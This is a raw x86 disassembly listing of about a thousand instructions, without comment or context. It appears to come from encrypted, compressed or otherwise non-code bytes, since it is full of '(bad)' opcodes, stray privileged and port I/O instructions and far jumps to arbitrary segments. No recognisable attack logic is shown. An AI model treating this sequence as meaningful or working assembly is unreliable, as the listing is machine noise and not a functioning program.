  41ad25:	(bad)  
  41ad26:	out    0x9f,al
  41ad28:	je     0x41acfc
  41ad2a:	icebp  
  41ad2b:	aaa    
  41ad2c:	mov    eax,ds:0xdb44f72f
  41ad31:	dec    esp
  41ad32:	jg     0x41ad0d
  41ad34:	add    DWORD PTR gs:[ebp-0x744ee372],0x7b
  41ad3c:	in     al,0x1e
  41ad3e:	push   esi
  41ad3f:	push   ecx
  41ad40:	cmp    BYTE PTR [bx+si],bl
  41ad43:	js     0x41ad38
  41ad45:	and    DWORD PTR [edx-0x2c],0xd
  41ad49:	scas   eax,DWORD PTR es:[edi]
  41ad4a:	jmp    0xfd5a:0x9bb29627
  41ad51:	shl    BYTE PTR [eax],0xa5
  41ad54:	into   
  41ad55:	inc    esi
  41ad56:	cmp    BYTE PTR [ebx-0x15eb66c0],0xa5
  41ad5d:	mov    al,ds:0xda98d353
  41ad62:	cmp    DWORD PTR [ecx+0x1f],ecx
  41ad65:	loope  0x41ad87
  41ad67:	dec    edi
  41ad68:	pop    eax
  41ad69:	aas    
  41ad6a:	sub    BYTE PTR [ecx+0x57],0x37
  41ad6e:	mov    eax,ds:0x1ccc9faf
  41ad73:	push   0x366af6be
  41ad78:	cdq    
  41ad79:	iret   
  41ad7a:	sbb    DWORD PTR [edi+esi*2-0x4c],edi
  41ad7e:	jecxz  0x41ad2d
  41ad80:	test   esi,esi
  41ad82:	and    DWORD PTR [edx-0x5ccb022f],eax
  41ad88:	push   edx
  41ad89:	mov    ebx,DWORD PTR [ebp-0x55d8653]
  41ad8f:	dec    ecx
  41ad90:	xchg   ebx,eax
  41ad91:	push   0x762684b3
  41ad96:	mov    DWORD PTR [eax],0xe653073e
  41ad9c:	ins    BYTE PTR es:[edi],dx
  41ad9d:	stos   BYTE PTR es:[edi],al
  41ad9e:	adc    ch,BYTE PTR ds:0x4d476af4
  41ada4:	ror    ebx,0xc3
  41ada7:	iret   
  41ada8:	sbb    edi,DWORD PTR [ebx]
  41adaa:	push   esi
  41adab:	adc    eax,0xc4ac0329
  41adb0:	mov    dl,0xc2
  41adb2:	jb     0x41ad6e
  41adb4:	add    si,WORD PTR [edx-0x15]
  41adb8:	fldenv [esi+0x9]
  41adbb:	ss pushf 
  41adbd:	add    BYTE PTR [edx+0x5b],al
  41adc0:	retf   
  41adc1:	in     eax,dx
  41adc2:	inc    esi
  41adc3:	jmp    0x67fe93cf
  41adc8:	es mov dh,0xe0
  41adcb:	pop    eax
  41adcd:	int3   
  41adce:	imul   edi,DWORD PTR [edx+0x2f],0x6
  41add2:	mov    ?,WORD PTR [ebx+0x2a]
  41add5:	mov    edi,0x6d0dc5a5
  41adda:	je     0x41ae1a
  41addc:	clc    
  41addd:	mov    BYTE PTR [ebp-0x1],dl
  41ade0:	sbb    al,0x21
  41ade2:	cwde   
  41ade3:	loop   0x41ae2c
  41ade5:	xchg   ah,cl
  41ade7:	mov    edi,0xc0c01a40
  41adec:	test   DWORD PTR [esi+0x35],ecx
  41adef:	sub    ah,bl
  41adf1:	mov    ?,WORD PTR [eax]
  41adf3:	lods   al,BYTE PTR ds:[esi]
  41adf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf5:	dec    esi
  41adf6:	sub    bl,bh
  41adf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf9:	pop    esi
  41adfa:	sub    BYTE PTR [bx+si],ch
  41adfd:	pusha  
  41adfe:	cmp    eax,0xd5a724c5
  41ae03:	jmp    0x41ad88
  41ae05:	adc    edi,DWORD PTR [edi+0x54f23a1f]
  41ae0b:	rol    DWORD PTR [edx+0x490a9814],cl
  41ae11:	ins    DWORD PTR es:[edi],dx
  41ae12:	jb     0x41ae56
  41ae14:	cmc    
  41ae15:	retf   
  41ae16:	ret    0x8c9c
  41ae19:	pop    ds
  41ae1a:	das    
  41ae1b:	push   edx
  41ae1c:	ss dec ebx
  41ae1e:	rol    dh,0x46
  41ae21:	cmp    BYTE PTR [ebp+0x1a],ah
  41ae24:	stc    
  41ae25:	cmc    
  41ae26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae27:	mov    BYTE PTR [ecx+0x3b],cl
  41ae2a:	(bad)  
  41ae2c:	mov    bh,0xcd
  41ae2e:	dec    esp
  41ae2f:	xlat   BYTE PTR ds:[ebx]
  41ae30:	enter  0x474b,0xa1
  41ae34:	adc    ecx,esi
  41ae36:	and    ebx,DWORD PTR [ecx-0x52]
  41ae39:	je     0x41adcf
  41ae3b:	js     0x41ae3f
  41ae3d:	(bad)  
  41ae3e:	into   
  41ae3f:	mov    BYTE PTR [ecx],0xf6
  41ae42:	popf   
  41ae43:	and    BYTE PTR [ebp+0x2d],al
  41ae46:	sbb    BYTE PTR [ecx],al
  41ae48:	mov    al,0xb
  41ae4a:	aas    
  41ae4b:	ds add eax,0x27605238
  41ae51:	push   cs
  41ae52:	test   eax,0x8ba48e1a
  41ae57:	pop    ebp
  41ae58:	aaa    
  41ae59:	push   edx
  41ae5a:	(bad)  
  41ae5b:	dec    esp
  41ae5c:	xchg   edx,eax
  41ae5d:	dec    esi
  41ae5e:	mov    bl,0x50
  41ae60:	pop    esp
  41ae61:	js     0x41ae01
  41ae63:	push   ebx
  41ae64:	adc    DWORD PTR [edi+0x3a],eax
  41ae67:	retf   
  41ae68:	or     dh,BYTE PTR [edi]
  41ae6a:	int3   
  41ae6b:	jmp    0x41ae49
  41ae6d:	mov    BYTE PTR [edx],al
  41ae6f:	lock or ecx,edi
  41ae72:	je     0x41ae39
  41ae74:	add    ah,cl
  41ae76:	push   es
  41ae77:	das    
  41ae78:	aad    0x7c
  41ae7a:	outs   dx,DWORD PTR ds:[esi]
  41ae7b:	sar    BYTE PTR [ecx],0x59
  41ae7e:	lods   al,BYTE PTR ds:[esi]
  41ae7f:	popa   
  41ae80:	imul   ebp,DWORD PTR [eax],0x66
  41ae83:	mov    eax,0x3fa6d02e
  41ae88:	lods   al,BYTE PTR ds:[esi]
  41ae89:	sub    al,BYTE PTR [edi+0x67]
  41ae8c:	sub    bl,dl
  41ae8e:	or     BYTE PTR [ebp-0x67],dl
  41ae91:	dec    edx
  41ae92:	and    eax,0xd0eeb144
  41ae97:	pusha  
  41ae98:	mov    ebx,0xfd17460a
  41ae9d:	jbe    0x41ae2a
  41ae9f:	and    esi,edx
  41aea1:	out    dx,eax
  41aea2:	xchg   ecx,eax
  41aea3:	xchg   BYTE PTR [ecx],al
  41aea5:	std    
  41aea6:	adc    eax,0xa60c1bac
  41aeab:	popf   
  41aeac:	data16 sbb al,ah
  41aeaf:	int    0xc4
  41aeb1:	dec    edi
  41aeb2:	gs cmc 
  41aeb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeb5:	ss popa 
  41aeb7:	in     eax,0x90
  41aeb9:	xor    DWORD PTR [ebx-0x3498f6eb],ecx
  41aebf:	push   es
  41aec0:	out    dx,al
  41aec1:	pop    ebx
  41aec2:	jae    0x41ae4e
  41aec4:	ss push ds
  41aec6:	mov    eax,0xf2b7638b
  41aecb:	xchg   esp,eax
  41aecc:	sub    ebp,DWORD PTR [ecx+edi*1]
  41aecf:	scas   al,BYTE PTR es:[edi]
  41aed0:	push   edi
  41aed1:	sbb    bh,bl
  41aed3:	or     ch,bh
  41aed5:	mov    ds:0xde14d1b2,al
  41aeda:	rcr    DWORD PTR [edx-0x1b4644cb],0xde
  41aee1:	sbb    esi,DWORD PTR gs:[ebx]
  41aee4:	cmp    al,dl
  41aee6:	push   ebp
  41aee7:	adc    bh,BYTE PTR [esi-0x1acaaa32]
  41aeed:	loop   0x41ae84
  41aeef:	int    0x2b
  41aef1:	iret   
  41aef2:	jecxz  0x41af58
  41aef4:	jmp    ecx
  41aef6:	push   ecx
  41aef7:	sti    
  41aef8:	mov    al,0x9c
  41aefa:	mov    al,0xa5
  41aefc:	sbb    eax,0x260bcdc
  41af01:	je     0x41af56
  41af03:	fcom   QWORD PTR [esi-0x47]
  41af06:	sbb    DWORD PTR [ecx+0x5eb8232e],ecx
  41af0c:	loopne 0x41af21
  41af0e:	aam    0xc2
  41af10:	mov    al,ds:0xf33675f6
  41af15:	call   0x47fd:0x8d20c032
  41af1c:	and    edi,esp
  41af1e:	cs mov ah,0xee
  41af21:	stos   BYTE PTR es:[edi],al
  41af22:	es sbb eax,0x7feb222c
  41af28:	retf   0x4fc
  41af2b:	jp     0x41af63
  41af2d:	stos   DWORD PTR es:[edi],eax
  41af2e:	frstor cs:[edi+eiz*2]
  41af32:	cs repnz pop ebp
  41af35:	mov    BYTE PTR [esi-0x34],dh
  41af38:	adc    bl,BYTE PTR [ecx+0x1413f6f2]
  41af3e:	inc    ecx
  41af3f:	add    BYTE PTR [edx+0x311c6fc9],0x0
  41af46:	push   0xf9521776
  41af4b:	and    BYTE PTR [ebp+0x6b648f04],0x0
  41af52:	add    esp,DWORD PTR [ebx]
  41af54:	in     al,0xfd
  41af56:	jbe    0x41af68
  41af58:	xchg   esi,eax
  41af59:	cld    
  41af5a:	test   DWORD PTR [esp+ecx*4],edi
  41af5d:	mov    al,ds:0x2a57f56b
  41af62:	push   eax
  41af64:	cs aad 0xfe
  41af67:	stos   BYTE PTR es:[edi],al
  41af68:	add    esp,DWORD PTR [eax+0x44e1ec1d]
  41af6e:	and    al,0x18
  41af70:	js     0x41af01
  41af72:	pop    ds
  41af73:	int3   
  41af74:	or     eax,esi
  41af76:	(bad)  
  41af78:	dec    edx
  41af79:	out    dx,al
  41af7a:	mov    ebx,0xba98cedc
  41af7f:	xor    eax,edi
  41af81:	call   0x1a2c:0x50f6c9e8
  41af88:	dec    ebp
  41af89:	push   0x3a
  41af8b:	test   eax,0x1dbfb34b
  41af90:	push   edi
  41af91:	out    0x38,eax
  41af93:	rcr    BYTE PTR ds:0xba6b8b2e,0xcd
  41af9a:	push   es
  41af9b:	outs   dx,DWORD PTR ds:[esi]
  41af9c:	jle    0x41aff8
  41af9e:	test   eax,0xe667863f
  41afa3:	rcl    BYTE PTR [ebp+0x6e3a56c5],1
  41afa9:	push   ebp
  41afaa:	dec    ecx
  41afab:	sahf   
  41afac:	jnp    0x41afb3
  41afae:	sub    esi,DWORD PTR [ebx-0x5ffcce49]
  41afb4:	data16 je 0x41b032
  41afb7:	xchg   edi,eax
  41afb8:	mov    dl,0x35
  41afba:	ret    0x2fea
  41afbd:	bound  edx,QWORD PTR [esi]
  41afbf:	test   al,0x1c
  41afc1:	cmp    BYTE PTR [eax+eiz*2-0x61f267fe],bh
  41afc8:	pop    ds
  41afc9:	mov    edi,0xc75ea9f4
  41afce:	or     DWORD PTR [esi+ebp*2],esp
  41afd1:	add    ecx,esi
  41afd3:	xchg   edi,eax
  41afd4:	hlt    
  41afd5:	xor    esp,ebp
  41afd7:	out    0xba,al
  41afd9:	and    al,0x3f
  41afdb:	sub    eax,DWORD PTR [ebp+0x3860128]
  41afe1:	cmp    BYTE PTR [eax+0x9],dh
  41afe4:	and    bl,ch
  41afe6:	(bad)  
  41afe7:	clc    
  41afe8:	and    edi,ebx
  41afea:	arpl   dx,bx
  41afec:	dec    edi
  41afed:	xchg   BYTE PTR [esi+esi*4],dl
  41aff0:	mov    eax,ds:0x3b6dbd9c
  41aff5:	arpl   WORD PTR [edi+ebp*2+0x21],dx
  41aff9:	fxch   st(0)
  41affb:	dec    ebx
  41affc:	scas   eax,DWORD PTR es:[edi]
  41affd:	push   ebp
  41affe:	imul   ebp,DWORD PTR [edi+0x47278408],0x12
  41b005:	(bad)  
  41b006:	clc    
  41b007:	mov    bl,0xa1
  41b009:	sub    DWORD PTR [eax+0x775f4481],ebp
  41b00f:	rol    DWORD PTR [ebp+0x58509dae],cl
  41b015:	push   esp
  41b016:	dec    edx
  41b017:	fcompp 
  41b019:	mov    ds:0xc9c28339,al
  41b01e:	lahf   
  41b01f:	add    BYTE PTR [esi-0x73],bh
  41b022:	retf   
  41b023:	mov    esp,DWORD PTR [esp+eiz*2]
  41b026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b027:	dec    eax
  41b028:	add    eax,0xae85c161
  41b02d:	aaa    
  41b02e:	sub    al,0xfa
  41b030:	xchg   esi,eax
  41b031:	mov    ds:0x325a07b9,eax
  41b036:	sub    DWORD PTR [ebx+0x560e52e2],esi
  41b03c:	enter  0xfda5,0x1e
  41b040:	add    BYTE PTR [edx-0x3a5d45c8],dl
  41b046:	dec    eax
  41b047:	push   ds
  41b048:	(bad)  
  41b049:	mov    bh,0x50
  41b04b:	mov    cs,WORD PTR [edx-0x48697d2]
  41b051:	push   ss
  41b052:	pusha  
  41b053:	xor    eax,0xe0f44056
  41b058:	add    BYTE PTR [eax+0x7a31f86b],bl
  41b05e:	pop    es
  41b05f:	das    
  41b060:	(bad)  
  41b061:	int3   
  41b062:	and    ebp,0x76
  41b065:	call   0x6c6f:0x9885cfef
  41b06c:	loop   0x41affe
  41b06e:	(bad)
  41b071:	inc    ecx
  41b072:	nop    ecx
  41b075:	into   
  41b076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b077:	pop    ebp
  41b078:	or     al,0x1f
  41b07a:	out    dx,eax
  41b07b:	xchg   esp,eax
  41b07c:	hlt    
  41b07d:	or     DWORD PTR [edx],0x1d88ea1
  41b083:	int3   
  41b084:	psubw  mm4,QWORD PTR [ebp+eax*4-0x7ce208bf]
  41b08c:	aas    
  41b08d:	or     esp,ebp
  41b08f:	nop    DWORD PTR [ecx]
  41b092:	and    BYTE PTR [ecx-0xa],ah
  41b095:	sub    BYTE PTR [ebx+edx*8-0x34],bh
  41b099:	add    esi,DWORD PTR [edi+0x11]
  41b09c:	cmp    DWORD PTR [ecx+edi*4-0x5d],ebp
  41b0a0:	popf   
  41b0a1:	mov    ebp,0x4de656ea
  41b0a6:	int3   
  41b0a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0a8:	(bad)  
  41b0a9:	shl    DWORD PTR [esi-0x342df4a9],1
  41b0af:	addr16 loopne 0x41b063
  41b0b2:	loope  0x41b0df
  41b0b4:	sbb    eax,0x3849369e
  41b0b9:	ins    DWORD PTR es:[edi],dx
  41b0ba:	dec    ebp
  41b0bb:	repnz sub al,0x41
  41b0be:	rcr    DWORD PTR ds:0xfdd40479,0x27
  41b0c5:	lahf   
  41b0c6:	dec    edx
  41b0c7:	repz test DWORD PTR [ebx+eax*4],edx
  41b0cb:	push   eax
  41b0cc:	mov    dh,0x13
  41b0ce:	bound  edx,QWORD PTR ds:0xc7da0bd7
  41b0d4:	imul   esi
  41b0d6:	pop    ecx
  41b0d7:	lea    edi,[ebp+0x20]
  41b0da:	xor    eax,DWORD PTR [esp+eiz*4+0x5e]
  41b0de:	out    dx,al
  41b0df:	pop    edi
  41b0e0:	push   ebp
  41b0e1:	mov    ah,0x78
  41b0e3:	sbb    esi,DWORD PTR [edx-0x2f]
  41b0e6:	jno    0x41b0f4
  41b0e8:	jo     0x41b0d6
  41b0ea:	int    0x73
  41b0ec:	pop    ebx
  41b0ed:	into   
  41b0ee:	fisubr DWORD PTR fs:[ebp-0x70]
  41b0f2:	add    al,0xc2
  41b0f4:	daa    
  41b0f5:	ret    0xed02
  41b0f8:	popf   
  41b0f9:	mov    ch,0x33
  41b0fb:	inc    esi
  41b0fc:	mov    al,0x79
  41b0fe:	mov    edx,0xd211276e
  41b103:	adc    DWORD PTR [ebx+0x34afaa78],ebp
  41b109:	mov    ebp,0x719e009d
  41b10e:	cmp    DWORD PTR [ebp-0x68],eax
  41b111:	add    edx,esp
  41b113:	mov    bh,0x42
  41b115:	or     ah,BYTE PTR [edi-0x34]
  41b118:	pusha  
  41b119:	lea    eax,[ecx]
  41b11b:	or     ebx,esi
  41b11d:	cmp    al,0xbb
  41b11f:	pop    edx
  41b120:	push   edi
  41b121:	pop    ecx
  41b122:	mov    cs,ecx
  41b124:	lahf   
  41b125:	xchg   esi,eax
  41b126:	xor    ebx,DWORD PTR [edi-0x3b8c004b]
  41b12c:	sub    eax,0x89ccf236
  41b131:	adc    ecx,ecx
  41b133:	shl    esp,cl
  41b135:	sub    BYTE PTR fs:[ebx-0x4665dec0],dh
  41b13c:	xchg   edi,eax
  41b13d:	push   ebp
  41b13e:	push   esp
  41b13f:	xchg   ecx,eax
  41b140:	lahf   
  41b141:	hlt    
  41b142:	xor    al,0x4c
  41b144:	jg     0x41b0fb
  41b146:	test   al,0x92
  41b148:	jmp    0xd9f4241f
  41b14d:	out    dx,eax
  41b14e:	xchg   ebp,eax
  41b14f:	push   edi
  41b150:	cmp    BYTE PTR [esi+0x75],bh
  41b153:	add    bl,cl
  41b155:	jl     0x41b1d0
  41b157:	pop    es
  41b158:	push   eax
  41b159:	ins    DWORD PTR es:[edi],dx
  41b15a:	test   al,0x6d
  41b15c:	and    bl,BYTE PTR [edx-0x3d]
  41b15f:	(bad)  
  41b162:	retf   0xd65f
  41b165:	cwde   
  41b166:	std    
  41b167:	retf   0x9e04
  41b16a:	xor    eax,DWORD PTR [ebx]
  41b16c:	and    DWORD PTR [esi+0x49242ff6],eax
  41b172:	push   esp
  41b173:	enter  0x34ed,0xb3
  41b177:	rol    DWORD PTR [edi+0x14],1
  41b17a:	std    
  41b17b:	(bad)  
  41b17c:	sti    
  41b17d:	push   0x1b
  41b17f:	dec    ebp
  41b180:	imul   ebp,DWORD PTR [ebx-0x53],0x3
  41b184:	imul   ebp,ebp,0x84c1fe45
  41b18a:	jae    0x41b1d7
  41b18c:	in     al,0xd5
  41b18e:	mov    ah,0xb9
  41b190:	pop    edi
  41b191:	jl     0x41b188
  41b193:	push   esp
  41b194:	xor    al,0x1
  41b196:	pushf  
  41b197:	or     esi,0x35
  41b19a:	inc    eax
  41b19b:	mov    ch,0x1b
  41b19d:	lods   al,BYTE PTR ds:[esi]
  41b19e:	sub    eax,0x85c61291
  41b1a3:	std    
  41b1a4:	sti    
  41b1a5:	sti    
  41b1a6:	push   0xfffffff1
  41b1a8:	adc    al,0xe6
  41b1aa:	mov    eax,0x606f6d84
  41b1af:	mov    WORD PTR [esi+0x6fdf2e49],ss
  41b1b5:	and    cl,BYTE PTR [ebp-0x12]
  41b1b8:	mov    bl,0x79
  41b1ba:	std    
  41b1bb:	inc    edi
  41b1bc:	out    dx,al
  41b1bd:	pop    edx
  41b1be:	(bad)  
  41b1bf:	scas   al,BYTE PTR es:[edi]
  41b1c0:	scas   eax,DWORD PTR es:[edi]
  41b1c1:	xor    edx,ebx
  41b1c3:	pop    ecx
  41b1c4:	sub    eax,0xa7c8511c
  41b1c9:	pop    es
  41b1ca:	lods   eax,DWORD PTR ds:[esi]
  41b1cb:	xchg   ebp,eax
  41b1cc:	and    ah,bl
  41b1ce:	call   0xb98:0x6219b137
  41b1d5:	retf   0xf857
  41b1d8:	lods   al,BYTE PTR ds:[esi]
  41b1d9:	test   DWORD PTR [esi-0x5b],ebx
  41b1dc:	inc    esp
  41b1dd:	dec    ebx
  41b1de:	stos   BYTE PTR es:[edi],al
  41b1df:	sub    DWORD PTR [esi-0x44],esp
  41b1e2:	jno    0x41b18b
  41b1e4:	cmc    
  41b1e5:	pushf  
  41b1e6:	lods   eax,DWORD PTR ds:[esi]
  41b1e7:	mov    edx,0xfbc323d8
  41b1ec:	loope  0x41b257
  41b1ee:	mov    ah,0x8
  41b1f0:	inc    esp
  41b1f1:	mov    ds:0x3f65d379,al
  41b1f6:	xchg   edx,eax
  41b1f7:	sahf   
  41b1f8:	xchg   edx,eax
  41b1f9:	xchg   ebp,eax
  41b1fa:	adc    ecx,esp
  41b1fc:	adc    al,0xb8
  41b1fe:	nop
  41b1ff:	call   0x1b6a65b6
  41b204:	scas   al,BYTE PTR es:[edi]
  41b205:	and    cl,dh
  41b207:	jno    0x41b268
  41b209:	hlt    
  41b20a:	push   esp
  41b20b:	adc    ch,BYTE PTR [esi-0x70008a2d]
  41b211:	xchg   ecx,eax
  41b212:	mov    ah,0xdc
  41b214:	xchg   esi,eax
  41b215:	xor    al,0xd2
  41b217:	leave  
  41b218:	and    BYTE PTR [ecx],0x17
  41b21b:	(bad)  
  41b21c:	pop    edx
  41b21d:	fadd   DWORD PTR [edx+0x25371e21]
  41b223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b224:	dec    ecx
  41b225:	stos   BYTE PTR es:[edi],al
  41b226:	mov    ch,0x18
  41b228:	jno    0x41b226
  41b22a:	mov    BYTE PTR [esi],ah
  41b22c:	jg     0x41b1ec
  41b22e:	push   0x6e
  41b230:	aas    
  41b231:	retf   
  41b232:	(bad)  [ebp-0x3f]
  41b235:	cmp    BYTE PTR [edx+ecx*1+0x37574725],dh
  41b23c:	inc    ecx
  41b23d:	dec    eax
  41b23e:	push   ss
  41b23f:	pop    eax
  41b240:	mov    dh,0x89
  41b242:	push   0xffffff84
  41b244:	jbe    0x41b2ab
  41b246:	fwait
  41b247:	loop   0x41b2c6
  41b249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b24a:	push   ss
  41b24b:	(bad)  
  41b24c:	repnz and BYTE PTR [esi+ebp*1+0x7ddffe6b],al
  41b254:	lock mov ecx,0x7804cde4
  41b25a:	mov    eax,0x9861ed27
  41b25f:	aam    0x9d
  41b261:	ret    
  41b262:	rcl    dh,0xe0
  41b265:	cmovae ebp,DWORD PTR fs:[esi+0x16]
  41b26a:	fimul  DWORD PTR [eax+ebx*8-0x68]
  41b26e:	adc    bh,bl
  41b270:	push   ebx
  41b271:	push   es
  41b272:	add    BYTE PTR [eax],ch
  41b274:	xchg   ebp,eax
  41b275:	lods   eax,DWORD PTR ds:[esi]
  41b276:	stos   BYTE PTR es:[edi],al
  41b277:	cdq    
  41b278:	mov    ah,0xa4
  41b27a:	(bad)  
  41b27b:	lahf   
  41b27c:	out    dx,eax
  41b27d:	scas   eax,DWORD PTR es:[edi]
  41b27e:	mov    ecx,0xf2d74544
  41b283:	pop    ebp
  41b284:	(bad)  
  41b285:	repz adc DWORD PTR [ecx+0x29183e02],0x63aabbb2
  41b290:	cmp    esi,DWORD PTR [ebx+0x67]
  41b293:	fwait
  41b294:	test   BYTE PTR ds:0x75d2bc63,dl
  41b29a:	push   eax
  41b29b:	or     eax,0xf7a99b91
  41b2a0:	xor    cl,cl
  41b2a2:	pop    edx
  41b2a3:	(bad)  
  41b2a4:	outs   dx,BYTE PTR ds:[esi]
  41b2a5:	pop    esi
  41b2a6:	fstp   TBYTE PTR [edi+0x3b]
  41b2a9:	dec    eax
  41b2aa:	ss dec esp
  41b2ac:	xor    DWORD PTR [ebp+0x50c8366d],eax
  41b2b2:	call   0x804b:0xbb33231b
  41b2b9:	mov    bl,0x66
  41b2bb:	push   edi
  41b2bc:	dec    ebp
  41b2bd:	adc    al,0xf7
  41b2bf:	aas    
  41b2c0:	shl    DWORD PTR [edx+0x5c081d1b],cl
  41b2c6:	sub    DWORD PTR [esi],edx
  41b2c8:	pop    ss
  41b2c9:	scas   eax,DWORD PTR es:[edi]
  41b2ca:	popa   
  41b2cb:	fnstcw WORD PTR [ecx-0x8e4d3cb]
  41b2d1:	jae    0x41b258
  41b2d3:	dec    ebx
  41b2d4:	mov    eax,ds:0xf3b5456f
  41b2d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2da:	push   ebp
  41b2db:	test   DWORD PTR [edi+0x25eca627],0xf7e1b27e
  41b2e5:	bound  esp,QWORD PTR [edi-0x6431ea77]
  41b2eb:	push   edx
  41b2ec:	add    ebx,DWORD PTR [ebx+0x92d3f39]
  41b2f2:	pop    edx
  41b2f3:	dec    ecx
  41b2f4:	pop    edi
  41b2f5:	sbb    BYTE PTR [edx+0x79edc0f8],cl
  41b2fb:	pop    ds
  41b2fc:	xlat   BYTE PTR ds:[ebx]
  41b2fd:	jb     0x41b375
  41b2ff:	je     0x41b2fd
  41b301:	dec    ecx
  41b302:	cli    
  41b303:	das    
  41b304:	jno    0x41b380
  41b306:	das    
  41b307:	call   0x5cf841ca
  41b30c:	dec    ebp
  41b30d:	adc    eax,0xd4a4cbee
  41b312:	sbb    al,0x38
  41b314:	shl    DWORD PTR [eax+eiz*8],0xe6
  41b318:	sbb    dh,BYTE PTR [esi]
  41b31a:	xchg   esp,eax
  41b31b:	stos   DWORD PTR es:[edi],eax
  41b31c:	ins    BYTE PTR es:[edi],dx
  41b31d:	dec    ecx
  41b31e:	or     bl,BYTE PTR [ecx+0x6]
  41b321:	enter  0x4f4b,0x89
  41b325:	fwait
  41b326:	and    ebx,DWORD PTR [ebx]
  41b328:	ds mov esi,0x723d656d
  41b32e:	cld    
  41b32f:	push   es
  41b330:	sbb    ah,BYTE PTR [edi+0x5e2ae7a6]
  41b336:	adc    ebx,DWORD PTR [esi-0x53f53037]
  41b33c:	push   0xd6551a9b
  41b341:	xchg   ebx,eax
  41b342:	push   eax
  41b343:	(bad)  
  41b344:	das    
  41b345:	mov    cl,0xe7
  41b347:	sub    dl,bh
  41b349:	dec    eax
  41b34a:	pop    esp
  41b34b:	retf   
  41b34c:	jg     0x41b35a
  41b34e:	sub    edi,DWORD PTR [ecx+0x5a]
  41b351:	add    eax,0x14d911ae
  41b356:	push   cs
  41b357:	out    0xf2,eax
  41b359:	loop   0x41b359
  41b35b:	inc    ebp
  41b35c:	mov    ss,esi
  41b35e:	leave  
  41b35f:	repnz push 0xffffffc9
  41b362:	xor    ch,BYTE PTR [ebx+0x37]
  41b365:	sub    DWORD PTR [ecx+0x1bb54f03],ecx
  41b36b:	cmp    eax,0xca220999
  41b370:	mov    WORD PTR [ebp-0x73],ds
  41b373:	gs jne 0x41b34d
  41b376:	outs   dx,BYTE PTR ds:[esi]
  41b377:	adc    eax,0xdb9286dc
  41b37c:	push   ss
  41b37d:	mov    edi,DWORD PTR [esi+0x73852668]
  41b383:	cdq    
  41b384:	push   esp
  41b385:	inc    esp
  41b386:	push   ss
  41b387:	xchg   esi,eax
  41b388:	pop    esi
  41b389:	or     al,0x75
  41b38b:	outs   dx,DWORD PTR ds:[esi]
  41b38c:	pop    ebp
  41b38d:	lar    eax,WORD PTR cs:[esi+0x4]
  41b392:	sbb    ebx,ebp
  41b394:	ds enter 0xbc09,0xad
  41b399:	daa    
  41b39a:	sbb    ah,BYTE PTR [esi]
  41b39c:	jae    0x41b3b0
  41b39e:	test   DWORD PTR [edi+0x40],ecx
  41b3a1:	jns    0x41b373
  41b3a3:	xchg   al,cl
  41b3a5:	stos   DWORD PTR es:[edi],eax
  41b3a6:	jae    0x41b3ee
  41b3a8:	cwde   
  41b3a9:	pop    esp
  41b3aa:	jge    0x41b391
  41b3ac:	daa    
  41b3ad:	lods   eax,DWORD PTR ds:[esi]
  41b3ae:	iret   
  41b3af:	imul   ebx,DWORD PTR [esi-0x53fefb22],0xdd3e514f
  41b3b9:	(bad)  
  41b3bb:	jle    0x41b3df
  41b3bd:	pop    ss
  41b3be:	ins    BYTE PTR es:[edi],dx
  41b3bf:	jecxz  0x41b39a
  41b3c1:	sub    dl,BYTE PTR [esi]
  41b3c3:	aam    0xe0
  41b3c5:	mov    ds:0xb88d378f,al
  41b3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3cb:	sub    esi,DWORD PTR [eax]
  41b3cd:	mov    BYTE PTR [eax+0x38],bh
  41b3d0:	sti    
  41b3d1:	pop    esp
  41b3d2:	in     eax,0x21
  41b3d4:	ror    DWORD PTR [esi-0x10],0x15
  41b3d8:	inc    esp
  41b3d9:	cmp    dl,BYTE PTR [edi]
  41b3db:	mov    ch,0xd8
  41b3dd:	pop    esp
  41b3de:	out    dx,eax
  41b3df:	jg     0x41b39b
  41b3e1:	xor    eax,0x47ddf6b9
  41b3e6:	push   0xedb8d444
  41b3eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ec:	push   ss
  41b3ed:	leave  
  41b3ee:	add    al,0x7a
  41b3f0:	jno    0x41b424
  41b3f2:	loope  0x41b3d4
  41b3f4:	push   cs
  41b3f5:	xor    DWORD PTR [ecx+0x6ead7c30],edi
  41b3fb:	add    DWORD PTR [esi+0x72423c5d],eax
  41b401:	push   eax
  41b402:	adc    DWORD PTR [esi+0x76],ebp
  41b405:	or     esp,DWORD PTR [ebp-0x5d7b029f]
  41b40b:	out    0x61,al
  41b40d:	(bad)  
  41b40e:	push   ss
  41b40f:	cwde   
  41b410:	retf   0x39a9
  41b413:	pop    eax
  41b414:	inc    edi
  41b415:	lds    esi,FWORD PTR [ebp+0x5a9ec15c]
  41b41b:	add    bh,bh
  41b41d:	leave  
  41b41e:	mov    cl,0x4b
  41b420:	aas    
  41b421:	pmaxsw mm2,mm3
  41b424:	aam    0xa7
  41b426:	xchg   edx,eax
  41b427:	sbb    ah,dl
  41b429:	jns    0x41b417
  41b42b:	pop    ecx
  41b42c:	inc    esi
  41b42d:	lea    ebp,[esi]
  41b42f:	inc    edi
  41b430:	add    eax,ecx
  41b432:	test   eax,0x94415dc2
  41b437:	mov    ah,0xef
  41b439:	push   esp
  41b43a:	mov    ch,0xa
  41b43c:	outs   dx,BYTE PTR ds:[esi]
  41b43d:	adc    BYTE PTR [eax-0x667d231c],al
  41b443:	cmp    al,0x4c
  41b445:	jecxz  0x41b3ca
  41b447:	stc    
  41b448:	mov    ?,WORD PTR [edi+0x6856b5ff]
  41b44e:	sbb    edi,DWORD PTR [esi-0x9]
  41b451:	xchg   ebx,eax
  41b452:	call   0x357e40f0
  41b457:	push   edi
  41b458:	mov    eax,ds:0xd481c39a
  41b45d:	xor    al,al
  41b45f:	gs inc ecx
  41b461:	out    0x7,eax
  41b463:	fldenv [eax+0x26]
  41b466:	inc    eax
  41b467:	mov    eax,ds:0x4085163c
